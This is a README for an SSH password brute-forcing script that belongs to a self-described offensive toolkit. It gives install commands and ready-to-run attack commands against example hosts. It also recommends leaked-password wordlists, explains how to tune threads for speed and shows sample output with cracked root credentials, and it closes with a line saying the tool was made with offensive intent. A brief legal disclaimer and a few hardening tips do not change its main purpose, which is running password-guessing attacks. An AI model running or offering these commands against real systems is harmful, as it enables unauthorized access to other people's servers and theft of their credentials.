## ⚡ Quick Start

```bash
# Clone the repository
git clone https://github.com/n0merc/HUBAXRCE.git
cd HUBAXRCE

# Install requirements
pip install -r requirements.txt

# Run the tool
python ssh_brute.py -t 192.168.1.100 -u root -w passwords.txt
```

## 🚀 Features

- **Multi-threaded attacks** - Blast through passwords with configurable threads
- **Smart results saving** - Automatically saves successful credentials
- **Performance metrics** - Tracks attempts per second and total time
- **Color-coded output** - Easy-to-read terminal interface
- **Repository integration** - Part of the HUBAXRCE offensive toolkit
- **Cross-platform** - Works on Linux, macOS, and Windows

## 📦 Installation

### Prerequisites

- Python 3.6 or higher
- pip package manager
- Network access to target

### Method 1: Clone Repository

```bash
git clone https://github.com/n0merc/HUBAXRCE.git
cd HUBAXRCE
pip install -r requirements.txt
```

### Method 2: Direct Download

```bash
# Download the script
wget https://raw.githubusercontent.com/n0merc/HUBAXRCE/main/ssh_brute.py

# Install dependencies
pip install paramiko colorama
```

### Verify Installation

```bash
python -c "import paramiko; import colorama; print('Dependencies installed successfully!')"
```

## 🎯 Usage

### Basic Syntax

```bash
python ssh_brute.py -t TARGET -u USERNAME -w WORDLIST
```

### Full Options

| Argument | Description | Default |
|----------|-------------|---------|
| `-t`, `--target` | Target host IP or domain | **Required** |
| `-u`, `--user` | Username to brute force | **Required** |
| `-w`, `--wordlist` | Password wordlist file | **Required** |
| `-p`, `--port` | SSH port number | 22 |
| `-th`, `--threads` | Number of concurrent threads | 10 |
| `-to`, `--timeout` | Connection timeout in seconds | 5 |
| `-q`, `--quiet` | Quiet mode (minimal output) | False |
| `-o`, `--output` | Custom output file for results | Auto-generated |

### Examples

**Basic attack on default SSH port:**
```bash
python ssh_brute.py -t 10.0.0.5 -u admin -w rockyou.txt
```

**Custom port with more threads:**
```bash
python ssh_brute.py -t 192.168.1.100 -u root -w passwords.txt -p 2222 -th 50
```

**Quiet mode for scripting:**
```bash
python ssh_brute.py -t target.com -u ubuntu -w wordlist.txt -q
```

**With custom timeout:**
```bash
python ssh_brute.py -t 10.10.10.10 -u test -w common.txt -to 3
```

## 📊 Wordlists

You need a password wordlist. Here are recommended sources:

### Popular Wordlists

1. **RockYou.txt** - Classic and effective
   ```bash
   wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
   ```

2. **SecLists** - Comprehensive collection
   ```bash
   git clone https://github.com/danielmiessler/SecLists.git
   ```

3. **Darkc0de.txt** - Another solid choice

### Generate Custom Wordlists

```bash
# Using Crunch
crunch 6 8 0123456789 -o numbers.txt

# Using Cewl
cewl https://target.com -w custom_words.txt
```

## 🔧 How It Works

### Technical Details

1. **Thread Management**
   - Creates multiple worker threads for parallel attacks
   - Uses queue system for password distribution
   - Thread-safe logging and result handling

2. **SSH Connection**
   - Uses Paramiko library for SSHv2 protocol
   - Implements proper error handling and timeouts
   - Supports custom SSH ports and banners

3. **Result Processing**
   - Immediately stops on successful login
   - Saves credentials to timestamped file
   - Calculates performance metrics

### Performance Optimization

- Adjust thread count based on network speed
- Use smaller wordlists for targeted attacks
- Increase timeout for slow networks
- Use `-q` flag for automated scripts

## 📈 Output Examples

### Successful Attack
```
██╗  ██╗██╗   ██╗██████╗  █████╗ ██╗  ██╗██████╗  ██████╗███████╗
██║  ██║██║   ██║██╔══██╗██╔══██╗╚██╗██╔╝██╔══██╗██╔════╝██╔════╝
███████║██║   ██║██████╔╝███████║ ╚███╔╝ ██████╔╝██║     █████╗  
██╔══██║██║   ██║██╔══██╗██╔══██║ ██╔██╗ ██╔══██╗██║     ██╔══╝  
██║  ██║╚██████╔╝██████╔╝██║  ██║██╔╝ ██╗██║  ██║╚██████╗███████╗
╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚══════╝

[*] HUBAXRCE SSH Brute Forcer
[*] Target: 192.168.1.100:22
[*] Username: root
[*] Threads: 10
[*] Timeout: 5s
[*] Loaded 10000 passwords
[*] Starting attack...

[+] FUCKING SUCCESS! root:toor works on 192.168.1.100:22
[+] Time elapsed: 45.23 seconds | Attempts: 1234
[+] Rate: 27.28 attempts/second
[*] Results saved to: hubax_ssh_results_2024-01-15_14-30-45.txt
```

### Results File
```txt
# HUBAXRCE SSH Brute Force Results
# Generated: Mon Jan 15 14:30:45 2024
# Tool: ssh_brute.py
# Repository: https://github.com/n0merc/HUBAXRCE.git

[SUCCESS]
Target: 192.168.1.100:22
Username: root
Password: toor
Time: 45.23 seconds
Attempts: 1234
Rate: 27.28 attempts/second

# Commands to use:
ssh root@192.168.1.100 -p 22
# Password: toor
```

## ⚠️ Legal Disclaimer

**THIS TOOL IS FOR AUTHORIZED SECURITY TESTING AND EDUCATIONAL PURPOSES ONLY.**

- You must have explicit permission to test the target system
- Unauthorized access to computer systems is illegal
- The developers assume no liability for misuse
- Use only on systems you own or have permission to test

By using this tool, you agree to use it responsibly and legally.

## 🔒 Security Considerations

- Use strong passwords on your own systems
- Implement SSH key authentication instead of passwords
- Use fail2ban or similar tools to block brute force attempts
- Regularly update and patch your systems
- Monitor authentication logs for suspicious activity

## 🤝 Contributing

Found a bug? Want to add features? Contribute to the HUBAXRCE repository:

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Submit a pull request

**Guidelines:**
- Follow PEP 8 coding standards
- Add comments for complex logic
- Update documentation
- Test your changes thoroughly

## 📚 Resources

- [Paramiko Documentation](http://www.paramiko.org/)
- [SSH Protocol Specification](https://tools.ietf.org/html/rfc4252)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Pentesting Methodology](https://pentest-book.six2dez.com/)

## 🐛 Troubleshooting

### Common Issues

**"ModuleNotFoundError: No module named 'paramiko'"**
```bash
pip install paramiko
```

**Wordlist not found**
```bash
# Download a wordlist
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt
```

**Connection timeout**
```bash
# Increase timeout
python ssh_brute.py -t target -u user -w wordlist.txt -to 10
```

**Slow performance**
```bash
# Increase threads
python ssh_brute.py -t target -u user -w wordlist.txt -th 50
```

## 📞 Support

- **GitHub Issues**: [HUBAXRCE Issues](https://github.com/n0merc/HUBAXRCE/issues)
- **Repository**: [https://github.com/n0merc/HUBAXRCE.git](https://github.com/n0merc/HUBAXRCE.git)
- **Follow Updates**: Star the repository for notifications

## 📄 License

MIT License - See LICENSE file for details.

```
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

---

**Made with offensive intent by the HUBAX Team**  
**Repository: https://github.com/n0merc/HUBAXRCE.git**  
**Use responsibly or face the fucking consequences**

